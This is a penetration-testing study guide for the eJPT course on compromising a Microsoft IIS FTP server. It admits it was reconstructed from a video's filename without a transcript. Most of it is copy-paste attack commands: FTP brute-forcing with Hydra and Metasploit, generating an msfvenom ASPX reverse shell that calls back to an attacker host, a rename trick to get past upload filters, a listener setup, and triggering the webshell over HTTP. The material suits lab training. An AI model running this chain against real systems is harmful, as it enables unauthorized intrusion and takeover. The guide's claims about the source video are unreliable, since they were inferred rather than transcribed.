# 06 - Targeting Microsoft IIS FTP

Note: No transcript was provided. The following summary is based on the filename and typical eJPT Windows exploitation workflow for targeting Microsoft IIS FTP (“Microsoft FTP Service”). Commands and paths are conservative, standard, and copy‑paste friendly.

## What the video covers (Introduction / big picture)
- Finding and enumerating Microsoft IIS FTP (port 21) on a Windows target.
- Checking for anonymous access and weak credentials.
- Mapping the FTP root to the web root (C:\inetpub\wwwroot) to achieve RCE by uploading a webshell/payload.
- Gaining a reverse shell via an ASPX payload and Metasploit handler.
- Practical enumeration and upload tips, including bypasses and hygiene.

## Flow (ordered)
1. Discover open ports and identify Microsoft FTP Service on 21; note HTTP on 80 if present.
2. Enumerate FTP features, OS type, anonymous access, and directory permissions.
3. Attempt anonymous login; if denied, try credential brute forcing.
4. If credentials work, explore directory structure to see if FTP maps to the IIS webroot (look for iisstart.htm, default.htm, etc.).
5. Generate an ASPX reverse shell payload with msfvenom.
6. Upload payload via FTP (binary mode). If extension filtering blocks upload, try rename (RNFR/RNTO) trick.
7. Start a listener/Metasploit multi/handler.
8. Trigger the payload via HTTP to get a shell.
9. Enumerate post-compromise and clean up uploaded artifacts.

## Tools highlighted
- Nmap (service detection and NSE: ftp-anon, ftp-syst, banner)
- netcat/telnet (manual banner grabbing)
- ftp or lftp (interactive or scripted file transfer)
- Hydra or Metasploit modules for FTP login brute force
- msfvenom (generate ASPX reverse shell / Meterpreter payload)
- Metasploit multi/handler (catch reverse shell)
- curl (trigger payload over HTTP)

## Typical command walkthrough (detailed, copy‑paste friendly)

Set variables first:
```bash
export TARGET=10.10.10.10
export LHOST=10.10.14.14
export LPORT=4444
```

1) Port scan and service enumeration:
```bash
# Quick top services
nmap -sC -sV -p21,80 -oN nmap_iis_ftp.txt $TARGET

# Deeper FTP enumeration
nmap -sV -p21 --script banner,ftp-anon,ftp-syst,ftp-bounce -oN nmap_ftp_enum.txt $TARGET

# Manual banner grab (optional)
nc -nv $TARGET 21
# After connect, try:
# SYST
# FEAT
# HELP
```

2) Anonymous access test:
```bash
# Nmap NSE test (already above) or manual:
ftp -inv $TARGET << 'EOF'
user anonymous anonymous@
pwd
ls
bye
EOF
```

3) Brute-force credentials (if anonymous fails):
```bash
# Hydra
hydra -L users.txt -P passwords.txt -f -o hydra_ftp.txt -u -t 4 ftp://$TARGET

# Metasploit alternative
msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS $TARGET; set USER_FILE users.txt; set PASS_FILE passwords.txt; set STOP_ON_SUCCESS true; run; exit"
```

4) Login and check if FTP maps to IIS webroot:
```bash
# Use lftp for stability and scripting; enable passive if needed
lftp -u USER,PASS $TARGET << 'EOF'
set ftp:passive-mode on
pwd
ls -la
# Look for typical webroot artifacts:
# - iisstart.htm / iisstart.png (IIS 7/8 default)
# - default.htm / default.aspx
# Try to list subdirs too
ls -la /
bye
EOF
```

5) Generate ASPX reverse shell payload:
```bash
# 64-bit Meterpreter (adjust to 32-bit payload if target is x86)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx

# Alternatively, a simple reverse cmd shell:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
```

6) Upload payload via FTP (binary mode) to webroot:
```bash
# If webroot appears to be current directory:
ftp -inv $TARGET << 'EOF'
user USER PASS
binary
pwd
ls
put shell.aspx
ls
bye
EOF
```

If upload is blocked by extension filtering, try rename trick:
```bash
ftp -inv $TARGET << 'EOF'
user USER PASS
binary
put shell.txt
quote RNFR shell.txt
quote RNTO shell.aspx
ls
bye
EOF
```

7) Start listener/Metasploit handler:
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; exploit -j"
```

8) Trigger payload over HTTP:
```bash
# If FTP mapped to the site's root and HTTP is on 80:
curl -v http://$TARGET/shell.aspx
# Or browse to it in a browser to trigger the callback
```

9) Post-exploitation quick checks (Meterpreter):
```text
# In Meterpreter:
sysinfo
getuid
shell
whoami && hostname && ipconfig
```

10) Cleanup (good hygiene):
```bash
# Delete the uploaded payload when done:
ftp -inv $TARGET << 'EOF'
user USER PASS
delete shell.aspx
bye
EOF
```

## Practical tips
- IIS fingerprint: The FTP banner often says “Microsoft FTP Service”; SYST often returns Windows_NT. The webroot commonly contains iisstart.htm (IIS 7/8 default page).
- Mapping confirmation: If you can see/edit files that appear at http://target/ (e.g., replace iisstart.htm and see changes), you’re in the webroot.
- Binary mode: Always switch FTP to binary before uploading payloads to avoid corruption.
- Passive mode: Use passive mode if behind NAT or if active mode stalls (set ftp:passive-mode on in lftp).
- Extensions: ASPX is more likely enabled on modern IIS than classic ASP; if ASPX fails to execute, try an ASP payload only if the feature is enabled.
- Rename bypass: If direct upload of .aspx is blocked, upload as .txt, then RNFR/RNTO to .aspx.
- Ports and egress: If your callback doesn’t arrive, try common outbound ports (80, 443) for the reverse shell.
- Credentials: IIS FTP commonly uses local Windows or AD accounts; weak passwords are common in labs. Try short userlists like: administrator, iisuser, ftp, web, developer, test.
- Cleanup: Remove uploaded shells and revert any test changes to avoid noisy artifacts.

## Minimal cheat sheet (one‑screen flow)
```bash
# Vars
export TARGET=10.10.10.10; export LHOST=10.10.14.14; export LPORT=4444

# Scan
nmap -sC -sV -p21,80 -oN nmap_iis_ftp.txt $TARGET
nmap -sV -p21 --script banner,ftp-anon,ftp-syst -oN nmap_ftp_enum.txt $TARGET

# Try anonymous
ftp -inv $TARGET << 'EOF'
user anonymous anonymous@
pwd
ls
bye
EOF

# If needed: brute
# hydra -L users.txt -P passwords.txt -f -o hydra_ftp.txt -u -t 4 ftp://$TARGET

# Generate ASPX payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx

# Upload (adjust USER/PASS)
ftp -inv $TARGET << 'EOF'
user USER PASS
binary
put shell.aspx
bye
EOF

# Handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit -j"

# Trigger
curl -v http://$TARGET/shell.aspx
```

## Summary
- Enumerate FTP on port 21 and verify it’s Microsoft FTP Service.
- Check anonymous access and directory permissions; if needed, brute-force logins.
- Confirm if the FTP root maps to C:\inetpub\wwwroot by looking for IIS default files.
- Generate an ASPX reverse shell payload with msfvenom, upload via FTP (binary mode), and trigger it over HTTP to gain code execution.
- Use Metasploit’s multi/handler to catch the callback and proceed with post-exploitation; clean up after yourself.

Because the transcript was unavailable, this guide captures the standard eJPT workflow for targeting Microsoft IIS FTP safely and effectively.